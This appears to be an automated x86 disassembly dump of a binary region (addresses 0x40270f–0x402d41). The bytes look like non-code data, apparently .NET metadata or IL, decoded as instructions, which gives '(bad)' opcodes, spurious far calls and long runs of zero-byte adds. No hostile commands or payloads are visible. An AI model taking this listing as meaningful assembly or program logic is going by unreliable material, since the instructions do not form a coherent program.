  40270f:	add    cl,BYTE PTR [esi-0x1eac097]
  402715:	(bad)  
  402716:	inc    DWORD PTR [ebx]
  402718:	push   eax
  402719:	sub    ch,BYTE PTR [edx+0x426f05]
  40271f:	add    BYTE PTR [edx],cl
  402721:	sub    al,0x2
  402723:	add    eax,0x174a032a
  402728:	pop    eax
  402729:	add    cl,BYTE PTR [esi+0x30b2f69]
  40272f:	and    eax,0x5458174a
  402734:	add    al,BYTE PTR [ebx]
  402736:	dec    edx
  402737:	call   0x600:0x24282a
  40273e:	add    al,0x73
  402740:	inc    ebp
  402741:	add    BYTE PTR [eax],al
  402743:	or     bh,BYTE PTR [edx+0x56]
  402746:	add    ebp,DWORD PTR [edi+0x42]
  402749:	add    BYTE PTR [eax],al
  40274b:	or     ch,BYTE PTR [esp+ecx*1]
  40274e:	add    ch,BYTE PTR [eax]
  402750:	and    eax,0x73060000
  402755:	daa    
  402756:	add    BYTE PTR [eax],al
  402758:	or     bh,BYTE PTR [edx+0x2a]
  40275b:	push   es
  40275c:	sub    bl,BYTE PTR [esi]
  40275e:	add    ch,BYTE PTR [eax]
  402760:	adc    al,0x0
  402762:	add    BYTE PTR [edx],cl
  402764:	sub    al,BYTE PTR [eax]
  402766:	add    BYTE PTR [eax],al
  402768:	adc    esi,DWORD PTR [eax]
  40276a:	add    al,0x0
  40276c:	push   edx
  40276d:	add    BYTE PTR [eax],al
  40276f:	add    BYTE PTR ds:0x12110000,al
  402775:	add    dh,bh
  402777:	adc    eax,0x2000007
  40277c:	adc    al,BYTE PTR [eax]
  40277e:	rol    BYTE PTR [edi],1
  402780:	add    BYTE PTR [eax],al
  402782:	add    ch,BYTE PTR [eax]
  402784:	inc    esi
  402785:	add    BYTE PTR [eax],al
  402787:	or     ch,BYTE PTR [eax]
  402789:	inc    edi
  40278a:	add    BYTE PTR [eax],al
  40278c:	or     bh,BYTE PTR [ebp+0x1f]
  40278f:	add    BYTE PTR [eax],al
  402791:	add    al,0x12
  402793:	add    BYTE PTR [edx],al
  402795:	jge    0x4027be
  402797:	add    BYTE PTR [eax],al
  402799:	add    al,0x12
  40279b:	add    BYTE PTR [edx],bl
  40279d:	jge    0x4027c3
  40279f:	add    BYTE PTR [eax],al
  4027a1:	add    al,0x72
  4027a3:	dec    ebp
  4027a4:	add    eax,DWORD PTR [eax]
  4027a6:	jo     0x4027b7
  4027a8:	add    DWORD PTR [edx-0x79],esi
  4027ab:	add    eax,DWORD PTR [eax]
  4027ad:	jo     0x4027d7
  4027af:	dec    eax
  4027b0:	add    BYTE PTR [eax],al
  4027b2:	or     ch,BYTE PTR [eax]
  4027b4:	inc    esp
  4027b5:	add    BYTE PTR [eax],al
  4027b7:	or     cl,BYTE PTR [ebx]
  4027b9:	pop    es
  4027ba:	adc    al,BYTE PTR [eax]
  4027bc:	add    al,0x5
  4027be:	sub    BYTE PTR [edx],dl
  4027c0:	add    BYTE PTR [eax],al
  4027c2:	push   es
  4027c3:	or     al,0x8
  4027c5:	sub    bl,BYTE PTR [esi]
  4027c7:	add    ch,BYTE PTR [eax]
  4027c9:	adc    al,0x0
  4027cb:	add    BYTE PTR [edx],cl
  4027cd:	sub    bl,BYTE PTR [esi]
  4027cf:	add    ch,BYTE PTR [eax]
  4027d1:	adc    al,0x0
  4027d3:	add    BYTE PTR [edx],cl
  4027d5:	sub    al,BYTE PTR [eax]
  4027d7:	add    BYTE PTR [ebx],dl
  4027d9:	xor    BYTE PTR [ebx],al
  4027db:	add    BYTE PTR [ebx],dh
  4027dd:	add    BYTE PTR [eax],al
  4027df:	add    BYTE PTR [esi],al
  4027e1:	add    BYTE PTR [eax],al
  4027e3:	adc    DWORD PTR [esi+0x28],edi
  4027e6:	add    BYTE PTR [eax],al
  4027e8:	add    al,0x14
  4027ea:	sub    BYTE PTR [ecx+0x0],dl
  4027ed:	add    BYTE PTR [edx],cl
  4027ef:	sub    al,0x20
  4027f1:	jb     0x40277e
  4027f3:	add    eax,DWORD PTR [eax]
  4027f5:	jo     0x4027c7
  4027f7:	or     DWORD PTR [eax],eax
  4027f9:	add    BYTE PTR [edx],al
  4027fb:	sub    BYTE PTR [esi+0x0],al
  4027fe:	add    BYTE PTR [edx],cl
  402800:	outs   dx,DWORD PTR ds:[esi]
  402801:	push   edx
  402802:	add    BYTE PTR [eax],al
  402804:	or     dh,BYTE PTR [ebx+0x53]
  402807:	add    BYTE PTR [eax],al
  402809:	or     cl,BYTE PTR [edx]
  40280b:	push   es
  40280c:	sub    BYTE PTR [eax],0x0
  40280f:	add    BYTE PTR [esi+edi*2],al
  402812:	sub    BYTE PTR [eax],al
  402814:	add    BYTE PTR [edx+ebp*1],al
  402817:	sbb    bh,BYTE PTR [esi+0x29]
  40281a:	add    BYTE PTR [eax],al
  40281c:	add    al,0x2a
  40281e:	push   ds
  40281f:	add    al,BYTE PTR [eax+0x4000029]
  402825:	sub    dl,BYTE PTR [esi+0x28]
  402828:	sbb    al,BYTE PTR [eax]
  40282a:	add    BYTE PTR [esi],al
  40282c:	jb     0x4027f1
  40282e:	add    eax,DWORD PTR [eax]
  402830:	jo     0x4028b0
  402832:	sub    DWORD PTR [eax],eax
  402834:	add    BYTE PTR [edi+ebp*2],al
  402837:	push   esp
  402838:	add    BYTE PTR [eax],al
  40283a:	or     ch,BYTE PTR [edx]
  40283c:	push   esi
  40283d:	sub    BYTE PTR [edx],bl
  40283f:	add    BYTE PTR [eax],al
  402841:	push   es
  402842:	jb     0x402829
  402844:	add    eax,DWORD PTR [eax]
  402846:	jo     0x4028c6
  402848:	sub    DWORD PTR [eax],eax
  40284a:	add    BYTE PTR [edi+ebp*2],al
  40284d:	push   esp
  40284e:	add    BYTE PTR [eax],al
  402850:	or     ch,BYTE PTR [edx]
  402852:	push   esi
  402853:	sub    BYTE PTR [edx],bl
  402855:	add    BYTE PTR [eax],al
  402857:	push   es
  402858:	jb     0x40285f
  40285a:	add    al,0x0
  40285c:	jo     0x4028dc
  40285e:	sub    DWORD PTR [eax],eax
  402860:	add    BYTE PTR [edi+ebp*2],al
  402863:	push   esp
  402864:	add    BYTE PTR [eax],al
  402866:	or     ch,BYTE PTR [edx]
  402868:	push   esi
  402869:	sub    BYTE PTR [edx],bl
  40286b:	add    BYTE PTR [eax],al
  40286d:	push   es
  40286e:	jb     0x4028a5
  402870:	add    al,0x0
  402872:	jo     0x4028f2
  402874:	sub    DWORD PTR [eax],eax
  402876:	add    BYTE PTR [edi+ebp*2],al
  402879:	push   esp
  40287a:	add    BYTE PTR [eax],al
  40287c:	or     ch,BYTE PTR [edx]
  40287e:	push   esi
  40287f:	sub    BYTE PTR [edx],bl
  402881:	add    BYTE PTR [eax],al
  402883:	push   es
  402884:	jb     0x4028e5
  402886:	add    al,0x0
  402888:	jo     0x402908
  40288a:	sub    DWORD PTR [eax],eax
  40288c:	add    BYTE PTR [edi+ebp*2],al
  40288f:	push   esp
  402890:	add    BYTE PTR [eax],al
  402892:	or     ch,BYTE PTR [edx]
  402894:	push   esi
  402895:	sub    BYTE PTR [edx],bl
  402897:	add    BYTE PTR [eax],al
  402899:	push   es
  40289a:	jb     0x402829
  40289c:	add    al,0x0
  40289e:	jo     0x40291e
  4028a0:	sub    DWORD PTR [eax],eax
  4028a2:	add    BYTE PTR [edi+ebp*2],al
  4028a5:	push   esp
  4028a6:	add    BYTE PTR [eax],al
  4028a8:	or     ch,BYTE PTR [edx]
  4028aa:	push   esi
  4028ab:	sub    BYTE PTR [edx],bl
  4028ad:	add    BYTE PTR [eax],al
  4028af:	push   es
  4028b0:	jb     0x40285d
  4028b2:	add    al,0x0
  4028b4:	jo     0x402934
  4028b6:	sub    DWORD PTR [eax],eax
  4028b8:	add    BYTE PTR [edi+ebp*2],al
  4028bb:	push   esp
  4028bc:	add    BYTE PTR [eax],al
  4028be:	or     ch,BYTE PTR [edx]
  4028c0:	push   esi
  4028c1:	sub    BYTE PTR [edx],bl
  4028c3:	add    BYTE PTR [eax],al
  4028c5:	push   es
  4028c6:	jb     0x40289f
  4028c8:	add    al,0x0
  4028ca:	jo     0x40294a
  4028cc:	sub    DWORD PTR [eax],eax
  4028ce:	add    BYTE PTR [edi+ebp*2],al
  4028d1:	push   esp
  4028d2:	add    BYTE PTR [eax],al
  4028d4:	or     ch,BYTE PTR [edx]
  4028d6:	push   esi
  4028d7:	sub    BYTE PTR [edx],bl
  4028d9:	add    BYTE PTR [eax],al
  4028db:	push   es
  4028dc:	jb     0x4028e3
  4028de:	add    eax,0x297e7000
  4028e3:	add    BYTE PTR [eax],al
  4028e5:	add    al,0x6f
  4028e7:	push   esp
  4028e8:	add    BYTE PTR [eax],al
  4028ea:	or     ch,BYTE PTR [edx]
  4028ec:	push   esi
  4028ed:	sub    BYTE PTR [edx],bl
  4028ef:	add    BYTE PTR [eax],al
  4028f1:	push   es
  4028f2:	jb     0x40292b
  4028f4:	add    eax,0x297e7000
  4028f9:	add    BYTE PTR [eax],al
  4028fb:	add    al,0x6f
  4028fd:	push   esp
  4028fe:	add    BYTE PTR [eax],al
  402900:	or     ch,BYTE PTR [edx]
  402902:	sbb    dh,BYTE PTR [ebx+0x28]
  402905:	add    BYTE PTR [eax],al
  402907:	push   es
  402908:	sub    cl,BYTE PTR [esi+0x2]
  40290b:	push   ss
  40290c:	sub    BYTE PTR [esi+0x0],dl
  40290f:	add    BYTE PTR [edx],cl
  402911:	add    bh,BYTE PTR [esi+0x57]
  402914:	add    BYTE PTR [eax],al
  402916:	or     ch,BYTE PTR [eax]
  402918:	pop    eax
  402919:	add    BYTE PTR [eax],al
  40291b:	or     ch,BYTE PTR [edx]
  40291d:	push   edx
  40291e:	add    dl,BYTE PTR [edi]
  402920:	sub    BYTE PTR [esi+0x0],dl
  402923:	add    BYTE PTR [edx],cl
  402925:	add    al,BYTE PTR [ebx]
  402927:	sub    BYTE PTR [ecx+0x0],bl
  40292a:	add    BYTE PTR [edx],cl
  40292c:	sub    BYTE PTR [eax+0x0],bl
  40292f:	add    BYTE PTR [edx],cl
  402931:	sub    dl,BYTE PTR [edx+0x2]
  402934:	pop    ss
  402935:	sub    BYTE PTR [esi+0x0],dl
  402938:	add    BYTE PTR [edx],cl
  40293a:	add    al,BYTE PTR [ebx]
  40293c:	sub    BYTE PTR [edx+0x0],bl
  40293f:	add    BYTE PTR [edx],cl
  402941:	sub    BYTE PTR [eax+0x0],bl
  402944:	add    BYTE PTR [edx],cl
  402946:	sub    bh,BYTE PTR [esi]
  402948:	add    bh,BYTE PTR [ebx+0x5b]
  40294b:	add    BYTE PTR [eax],al
  40294d:	or     al,BYTE PTR [ebx]
  40294f:	add    al,0x5
  402951:	sub    BYTE PTR [eax+eax*1+0x0],bl
  402955:	or     ch,BYTE PTR [edx]
  402957:	jb     0x40295b
  402959:	outs   dx,DWORD PTR ds:[esi]
  40295a:	pop    ebp
  40295b:	add    BYTE PTR [eax],al
  40295d:	or     ch,BYTE PTR [esi+eax*1]
  402960:	jae    0x4029c0
  402962:	add    BYTE PTR [eax],al
  402964:	or     bh,BYTE PTR [edx+0x3]
  402967:	add    bh,BYTE PTR [ebx+0x5b]
  40296a:	add    BYTE PTR [eax],al
  40296c:	or     al,BYTE PTR [eax+ebp*1]
  40296f:	pop    edi
  402970:	add    BYTE PTR [eax],al
  402972:	or     ch,BYTE PTR [edx]
  402974:	outs   dx,BYTE PTR ds:[esi]
  402975:	add    bh,BYTE PTR [ebx+0x5b]
  402978:	add    BYTE PTR [eax],al
  40297a:	or     dl,al
  40297c:	add    al,BYTE PTR [eax]
  40297e:	add    BYTE PTR [ebx],bl
  402980:	sub    BYTE PTR [esi+0x0],al
  402983:	add    BYTE PTR [edx],cl
  402985:	sub    BYTE PTR [eax+0x0],ah
  402988:	add    BYTE PTR [edx],cl
  40298a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40298b:	add    al,BYTE PTR [eax]
  40298d:	add    BYTE PTR [ebx],bl
  40298f:	sub    ch,BYTE PTR [esi+0x2]
  402992:	outs   dx,DWORD PTR ds:[esi]
  402993:	pop    ebp
  402994:	add    BYTE PTR [eax],al
  402996:	or     ch,BYTE PTR ds:0x5b7b0211
  40299c:	add    BYTE PTR [eax],al
  40299e:	or     ch,BYTE PTR [eax]
  4029a0:	popa   
  4029a1:	add    BYTE PTR [eax],al
  4029a3:	or     al,BYTE PTR [edx]
  4029a5:	sub    BYTE PTR [edx+0x0],ah
  4029a8:	add    BYTE PTR [edx],cl
  4029aa:	pop    ss
  4029ab:	sub    cl,BYTE PTR [esi+0x2]
  4029ae:	pop    ss
  4029af:	sub    BYTE PTR [esi+0x0],dl
  4029b2:	add    BYTE PTR [edx],cl
  4029b4:	add    bh,BYTE PTR [esi+0x57]
  4029b7:	add    BYTE PTR [eax],al
  4029b9:	or     ch,BYTE PTR [eax]
  4029bb:	pop    eax
  4029bc:	add    BYTE PTR [eax],al
  4029be:	or     ch,BYTE PTR [edx]
  4029c0:	add    dl,BYTE PTR ds:[edi]
  4029c3:	sub    BYTE PTR [esi+0x0],dl
  4029c6:	add    BYTE PTR [edx],cl
  4029c8:	add    al,BYTE PTR [ebx]
  4029ca:	sub    BYTE PTR [eax+0x0],bl
  4029cd:	add    BYTE PTR [edx],cl
  4029cf:	sub    bl,BYTE PTR [esi]
  4029d1:	add    bh,BYTE PTR [ebx+0x5b]
  4029d4:	add    BYTE PTR [eax],al
  4029d6:	or     ch,BYTE PTR [edx]
  4029d8:	dec    edx
  4029d9:	add    bh,BYTE PTR [ebx+0x5b]
  4029dc:	add    BYTE PTR [eax],al
  4029de:	or     ch,BYTE PTR [eax]
  4029e0:	xor    al,BYTE PTR [eax]
  4029e2:	add    BYTE PTR [esi],al
  4029e4:	push   ss
  4029e5:	inc    BYTE PTR [ecx]
  4029e7:	push   ss
  4029e8:	inc    BYTE PTR [ecx]
  4029ea:	sub    al,BYTE PTR [eax]
  4029ec:	adc    esi,DWORD PTR [eax]
  4029ee:	add    al,BYTE PTR [eax]
  4029f0:	adc    al,BYTE PTR [eax]
  4029f2:	add    BYTE PTR [eax],al
  4029f4:	pop    es
  4029f5:	add    BYTE PTR [eax],al
  4029f7:	adc    DWORD PTR [eax],ebp
  4029f9:	pop    ss
  4029fa:	add    BYTE PTR [eax],al
  4029fc:	or     cl,BYTE PTR [edx]
  4029fe:	push   es
  4029ff:	sub    eax,0x62a1402
  402a04:	outs   dx,DWORD PTR ds:[esi]
  402a05:	arpl   WORD PTR [eax],ax
  402a07:	add    BYTE PTR [edx],cl
  402a09:	sub    al,BYTE PTR [eax]
  402a0b:	add    BYTE PTR [ebx],bl
  402a0d:	xor    BYTE PTR ds:0xd500,al
  402a13:	add    BYTE PTR [eax],cl
  402a15:	add    BYTE PTR [eax],al
  402a17:	adc    DWORD PTR [edx],edx
  402a19:	add    dh,bh
  402a1b:	adc    eax,0x200000f
  402a20:	add    ch,BYTE PTR [eax]
  402a22:	xor    eax,DWORD PTR [eax]
  402a24:	add    BYTE PTR [edx],cl
  402a26:	sub    eax,0x2001208
  402a2b:	jge    0x402a78
  402a2d:	add    BYTE PTR [eax],al
  402a2f:	add    al,0x12
  402a31:	add    BYTE PTR [ebx],al
  402a33:	jge    0x402a7f
  402a35:	add    BYTE PTR [eax],al
  402a37:	add    al,0x12
  402a39:	add    esi,edi
  402a3b:	adc    eax,0x2000010
  402a40:	adc    al,BYTE PTR [edx]
  402a42:	adc    al,BYTE PTR [ecx]
  402a44:	loopne 0x402a6e
  402a46:	add    BYTE PTR fs:[eax],al
  402a49:	or     dl,BYTE PTR [esi+edi*2]
  402a4c:	push   edi
  402a4d:	add    BYTE PTR [eax],al
  402a4f:	or     bl,BYTE PTR [ecx]
  402a51:	adc    al,BYTE PTR [eax]
  402a53:	or     BYTE PTR [eax],ch
  402a55:	dec    edi
  402a56:	add    BYTE PTR [eax],al
  402a58:	push   es
  402a59:	or     eax,0x1b082c09
  402a5e:	adc    eax,DWORD PTR [esi]
  402a60:	fld    QWORD PTR [ebp+0x8000000]
  402a66:	sub    BYTE PTR [ebp+0x0],ah
  402a69:	add    BYTE PTR [edx],cl
  402a6b:	adc    eax,DWORD PTR [ecx+edx*1]
  402a6e:	add    al,0xd0
  402a70:	adc    BYTE PTR [eax],al
  402a72:	add    BYTE PTR [edx],al
  402a74:	sub    BYTE PTR [esi+0x0],al
  402a77:	add    BYTE PTR [edx],cl
  402a79:	sub    BYTE PTR [eax+0x0],ah
  402a7c:	add    BYTE PTR [edx],cl
  402a7e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402a7f:	adc    BYTE PTR [eax],al
  402a81:	add    BYTE PTR [edx],al
  402a83:	adc    eax,DWORD PTR ds:0x507b0512
  402a89:	add    BYTE PTR [eax],al
  402a8b:	add    al,0x13
  402a8d:	pop    es
  402a8e:	adc    DWORD PTR [edi],eax
  402a90:	push   ss
  402a91:	cs and al,0x11
  402a94:	pop    es
  402a95:	and    ch,al
  402a97:	or     BYTE PTR [eax],al
  402a99:	add    BYTE PTR [esi],ch
  402a9b:	and    BYTE PTR [ecx],dl
  402a9d:	pop    es
  402a9e:	and    BYTE PTR [edi+0x5900000a],cl
  402aa4:	inc    ebp
  402aa5:	add    eax,DWORD PTR [eax]
  402aa7:	add    BYTE PTR [eax],al
  402aa9:	or     al,0x0
  402aab:	add    BYTE PTR [eax],al
  402aad:	adc    DWORD PTR [eax],eax
  402aaf:	add    BYTE PTR [eax],al
  402ab1:	push   ss
  402ab2:	add    BYTE PTR [eax],al
  402ab4:	add    BYTE PTR [ebx],ch
  402ab6:	sbb    DWORD PTR [esi],edx
  402ab8:	adc    eax,DWORD PTR [esi]
  402aba:	fisubr WORD PTR [esi]
  402abc:	pop    ss
  402abd:	adc    eax,DWORD PTR [esi]
  402abf:	fisubr WORD PTR [ecx]
  402ac1:	sbb    BYTE PTR [ebx],dl
  402ac3:	push   es
  402ac4:	fisub  WORD PTR [ecx+ebx*1]
  402ac7:	adc    eax,DWORD PTR [esi]
  402ac9:	ficomp WORD PTR [edi]
  402acb:	sbb    dl,BYTE PTR [ebx]
  402acd:	push   es
  402ace:	ficomp WORD PTR [edx]
  402ad0:	sbb    dl,BYTE PTR [ebx]
  402ad2:	push   es
  402ad3:	ficom  WORD PTR ds:0x577e08
  402ad9:	add    BYTE PTR [edx],cl
  402adb:	sub    BYTE PTR [esi+0x0],ah
  402ade:	add    BYTE PTR [edx],cl
  402ae0:	sub    al,0x7
  402ae2:	or     BYTE PTR [eax],ch
  402ae4:	push   eax
  402ae5:	add    BYTE PTR [eax],al
  402ae7:	push   es
  402ae8:	fcom   QWORD PTR es:[ecx]
  402aeb:	push   es
  402aec:	sub    al,BYTE PTR [eax]
  402aee:	add    BYTE PTR [eax],al
  402af0:	add    DWORD PTR [eax],edx
  402af2:	add    BYTE PTR [eax],al
  402af4:	add    al,BYTE PTR [eax]
  402af6:	xor    al,BYTE PTR [eax]
  402af8:	mov    edi,DWORD PTR [ebp+0x1500]
  402afe:	add    BYTE PTR [eax],al
  402b00:	inc    esi
  402b01:	add    ch,BYTE PTR [eax]
  402b03:	xor    eax,DWORD PTR [eax]
  402b05:	add    BYTE PTR [edx],cl
  402b07:	sub    al,0x2
  402b09:	pop    ss
  402b0a:	sub    al,BYTE PTR [edx]
  402b0c:	sub    BYTE PTR [esi],bh
  402b0e:	add    BYTE PTR [eax],al
  402b10:	push   es
  402b11:	sub    al,BYTE PTR [eax]
  402b13:	add    BYTE PTR [ebx],bl
  402b15:	xor    BYTE PTR [edx],al
  402b17:	add    bh,dh
  402b19:	add    BYTE PTR [eax],al
  402b1b:	add    BYTE PTR [ecx],cl
  402b1d:	add    BYTE PTR [eax],al
  402b1f:	adc    DWORD PTR [edx],eax
  402b21:	sub    eax,0x22a1702
  402b26:	outs   dx,DWORD PTR ds:[esi]
  402b27:	add    BYTE PTR [bx+si],al
  402b2a:	or     dl,BYTE PTR [eax]
  402b2c:	add    BYTE PTR [edx],al
  402b2e:	outs   dx,DWORD PTR ds:[esi]
  402b2f:	inc    edx
  402b30:	add    BYTE PTR [eax],al
  402b32:	or     ch,BYTE PTR [ecx+ecx*1]
  402b35:	add    dl,BYTE PTR [esi]
  402b37:	outs   dx,DWORD PTR ds:[esi]
  402b38:	inc    ebx
  402b39:	add    BYTE PTR [eax],al
  402b3b:	or     ch,BYTE PTR ds:0x142a1702
  402b41:	or     ch,BYTE PTR [eax]
  402b43:	push   0xa0a0000
  402b48:	push   es
  402b49:	sub    BYTE PTR [ecx+0x0],ch
  402b4c:	add    BYTE PTR [edx],cl
  402b4e:	or     ebx,esi
  402b50:	adc    ah,BYTE PTR [esi]
  402b52:	push   ss
  402b53:	adc    eax,DWORD PTR [edi]
  402b55:	fnstsw WORD PTR [edx+0x26000000]
  402b5b:	push   ss
  402b5c:	adc    eax,DWORD PTR [edi]
  402b5e:	fnsave [ecx+0x6000000]
  402b64:	add    ch,BYTE PTR [edi+0x3c]
  402b67:	add    BYTE PTR [eax],al
  402b69:	or     ch,BYTE PTR [edx+eax*1]
  402b6c:	pop    ss
  402b6d:	sub    al,BYTE PTR [edx]
  402b6f:	adc    al,BYTE PTR [edx]
  402b71:	sub    BYTE PTR [edx+0x0],ch
  402b74:	add    BYTE PTR [edx],cl
  402b76:	sub    al,0x34
  402b78:	or     BYTE PTR [eax],ch
  402b7a:	imul   eax,DWORD PTR [eax],0x0
  402b7d:	or     ch,BYTE PTR [edx+eax*1]
  402b80:	pop    ss
  402b81:	sub    al,BYTE PTR [edi]
  402b83:	adc    ecx,DWORD PTR [eax]
  402b85:	push   ss
  402b86:	adc    ecx,DWORD PTR [ecx]
  402b88:	sub    ebx,DWORD PTR [edx]
  402b8a:	adc    DWORD PTR [eax],ecx
  402b8c:	adc    DWORD PTR [ecx],ecx
  402b8e:	call   0x6c:0x6f08090d
  402b95:	add    BYTE PTR [edx],cl
  402b97:	sub    al,0x5
  402b99:	pop    ss
  402b9a:	adc    eax,DWORD PTR [edi]
  402b9c:	fidiv  WORD PTR [esi+0x11]
  402b9f:	or     DWORD PTR [edi],edx
  402ba1:	pop    eax
  402ba2:	adc    ecx,DWORD PTR [ecx]
  402ba4:	adc    DWORD PTR [ecx],ecx
  402ba6:	adc    DWORD PTR [eax],ecx
  402ba8:	mov    gs,WORD PTR [ecx+0x32]
  402bab:	fiadd  WORD PTR [edx]
  402bad:	sub    BYTE PTR [ebp+0x0],ch
  402bb0:	add    BYTE PTR [edx],cl
  402bb2:	adc    eax,DWORD PTR [esi+ebx*8]
  402bb5:	or     al,0x26
  402bb7:	push   ss
  402bb8:	adc    eax,DWORD PTR [edi]
  402bba:	ficomp WORD PTR [eax+0x26]
  402bbd:	push   ss
  402bbe:	adc    eax,DWORD PTR [edi]
  402bc0:	ficom  WORD PTR [edx+0x11]
  402bc3:	add    al,0x6f
  402bc5:	outs   dx,BYTE PTR ds:[esi]
  402bc6:	add    BYTE PTR [eax],al
  402bc8:	or     dl,BYTE PTR [ebx]
  402bca:	or     dl,BYTE PTR [esi]
  402bcc:	adc    ecx,DWORD PTR [ebx]
  402bce:	sub    edi,DWORD PTR [edx]
  402bd0:	adc    DWORD PTR [edx],ecx
  402bd2:	adc    DWORD PTR [ebx],ecx
  402bd4:	call   0x160c:0x13070513
  402bdb:	adc    ecx,DWORD PTR ds:0xc111d2b
  402be1:	adc    DWORD PTR ds:0x1106139a,ecx
  402be7:	push   es
  402be8:	adc    DWORD PTR ds:0x6c6f,eax
  402bee:	or     ch,BYTE PTR [eax*1-0x21f8ece9]
  402bf5:	push   ds
  402bf6:	adc    DWORD PTR ds:0xd135817,ecx
  402bfc:	adc    DWORD PTR ds:0x698e0c11,ecx
  402c02:	xor    bl,bl
  402c04:	adc    DWORD PTR [ebx],ecx
  402c06:	pop    ss
  402c07:	pop    eax
  402c08:	adc    ecx,DWORD PTR [ebx]
  402c0a:	adc    DWORD PTR [ebx],ecx
  402c0c:	adc    DWORD PTR [edx],ecx
  402c0e:	mov    gs,WORD PTR [ecx+0x32]
  402c11:	mov    esi,0x7112a16
  402c16:	sub    al,BYTE PTR [eax]
  402c18:	add    DWORD PTR [eax+eax*1],esi
  402c1b:	add    BYTE PTR [eax],al
  402c1d:	add    BYTE PTR [edx],ah
  402c1f:	add    BYTE PTR [edi],cl
  402c21:	xor    DWORD PTR [eax],eax
  402c23:	or     DWORD PTR [ecx+0x0],edx
  402c26:	add    BYTE PTR [ecx],al
  402c28:	add    BYTE PTR [eax],al
  402c2a:	and    al,BYTE PTR [eax]
  402c2c:	(bad)  
  402c2f:	or     DWORD PTR [eax+eax*1],edi
  402c32:	add    BYTE PTR [ecx],al
  402c34:	add    BYTE PTR [eax],al
  402c36:	mov    WORD PTR [eax],es
  402c38:	or     dl,BYTE PTR [esi+0x510600]
  402c3e:	add    BYTE PTR [ecx],al
  402c40:	add    BYTE PTR [eax],al
  402c42:	mov    WORD PTR [eax],es
  402c44:	or     bl,BYTE PTR [eax+eax*1+0x3c06]
  402c4b:	add    DWORD PTR [ebx],edx
  402c4d:	xor    BYTE PTR [ebx],al
  402c4f:	add    BYTE PTR [esi+0x0],bh
  402c52:	add    BYTE PTR [eax],al
  402c54:	or     al,BYTE PTR [eax]
  402c56:	add    BYTE PTR [ecx],dl
  402c58:	add    al,0x16
  402c5a:	push   edx
  402c5b:	add    ch,BYTE PTR [eax]
  402c5d:	xor    eax,DWORD PTR [eax]
  402c5f:	add    BYTE PTR [edx],cl
  402c61:	sub    al,0x2
  402c63:	push   ss
  402c64:	sub    al,BYTE PTR [ebx]
  402c66:	sub    eax,0x52170405
  402c6b:	push   ss
  402c6c:	sub    al,BYTE PTR [edx]
  402c6e:	sub    BYTE PTR [esi],dh
  402c70:	add    BYTE PTR [eax],al
  402c72:	push   es
  402c73:	sub    eax,0x22a1602
  402c78:	add    edx,DWORD PTR [edi]
  402c7a:	sub    BYTE PTR ds:0xa060000,bh
  402c80:	push   es
  402c81:	sub    al,0x8
  402c83:	push   es
  402c84:	outs   dx,DWORD PTR ds:[esi]
  402c85:	pop    ebp
  402c86:	add    BYTE PTR [eax],al
  402c88:	or     ch,BYTE PTR [ecx+ecx*2]
  402c8b:	sub    BYTE PTR [ecx],bh
  402c8d:	add    BYTE PTR [eax],al
  402c8f:	push   es
  402c90:	or     edi,DWORD PTR [esi+0x13]
  402c93:	add    BYTE PTR [eax],al
  402c95:	or     cl,BYTE PTR [edx+eax*1]
  402c98:	pop    ds
  402c99:	pop    esp
  402c9a:	outs   dx,DWORD PTR ds:[esi]
  402c9b:	outs   dx,DWORD PTR ds:[esi]
  402c9c:	add    BYTE PTR [eax],al
  402c9e:	or     cl,BYTE PTR ds:0x92e1509
  402ca4:	add    dl,BYTE PTR [esi]
  402ca6:	or     DWORD PTR [edi+0x70],ebp
  402ca9:	add    BYTE PTR [eax],al
  402cab:	or     cl,BYTE PTR [eax+ecx*1]
  402cae:	sub    BYTE PTR [ebx],dh
  402cb0:	add    BYTE PTR [eax],al
  402cb2:	or     ch,BYTE PTR ds:0x3728080a
  402cb8:	add    BYTE PTR [eax],al
  402cba:	push   es
  402cbb:	sub    al,0x2
  402cbd:	push   ss
  402cbe:	sub    al,BYTE PTR [edi]
  402cc0:	sub    eax,0x5c1f020d
  402cc5:	outs   dx,DWORD PTR ds:[esi]
  402cc6:	outs   dx,DWORD PTR ds:[esi]
  402cc7:	add    BYTE PTR [eax],al
  402cc9:	or     dl,BYTE PTR ds:0x2a17022e
  402ccf:	add    al,0x17
  402cd1:	push   edx
  402cd2:	push   ss
  402cd3:	sub    dl,BYTE PTR [edi]
  402cd5:	sub    al,BYTE PTR [eax]
  402cd7:	add    BYTE PTR [ebx],dl
  402cd9:	xor    BYTE PTR [ebx],al
  402cdb:	add    BYTE PTR [ebx],bh
  402cdd:	add    BYTE PTR [eax],al
  402cdf:	add    BYTE PTR [ebx],cl
  402ce1:	add    BYTE PTR [eax],al
  402ce3:	adc    DWORD PTR [esi],edx
  402ce5:	or     ah,BYTE PTR [eax]
  402ce7:	add    al,0x1
  402ce9:	add    BYTE PTR [eax],al
  402ceb:	or     esp,DWORD PTR [eax]
  402ced:	add    al,0x1
  402cef:	add    BYTE PTR [eax],al
  402cf1:	jae    0x402d64
  402cf3:	add    BYTE PTR [eax],al
  402cf5:	or     cl,BYTE PTR [eax+ebx*1]
  402cf8:	or     BYTE PTR [edx],dl
  402cfa:	add    DWORD PTR [eax],ebp
  402cfc:	push   esi
  402cfd:	add    BYTE PTR [eax],al
  402cff:	push   es
  402d00:	sub    eax,0x72280a
  402d05:	add    BYTE PTR [edx],cl
  402d07:	sub    BYTE PTR [ebx+0x0],dh
  402d0a:	add    BYTE PTR [edx],cl
  402d0c:	or     BYTE PTR [edi+0x74],ch
  402d0f:	add    BYTE PTR [eax],al
  402d11:	or     cl,BYTE PTR ds:0x332809
  402d17:	add    BYTE PTR [edx],cl
  402d19:	push   ss
  402d1a:	inc    BYTE PTR [ecx]
  402d1c:	or     al,BYTE PTR [esi]
  402d1e:	sub    al,BYTE PTR [eax]
  402d20:	adc    esi,DWORD PTR [eax]
  402d22:	add    DWORD PTR [eax],eax
  402d24:	sub    BYTE PTR [eax],al
  402d26:	add    BYTE PTR [eax],al
  402d28:	or     al,0x0
  402d2a:	add    BYTE PTR [ecx],dl
  402d2c:	push   ss
  402d2d:	or     dl,BYTE PTR [ebx+ecx*1]
  402d30:	add    ch,BYTE PTR [esi+edx*1]
  402d33:	add    ch,BYTE PTR [edi+0x5d]
  402d36:	add    BYTE PTR [eax],al
  402d38:	or     ch,BYTE PTR ds:0x316f020e
  402d3e:	add    BYTE PTR [eax],al
  402d40:	push   es
  402d41:	sub    BYTE PTR [ebp+0x0],dh
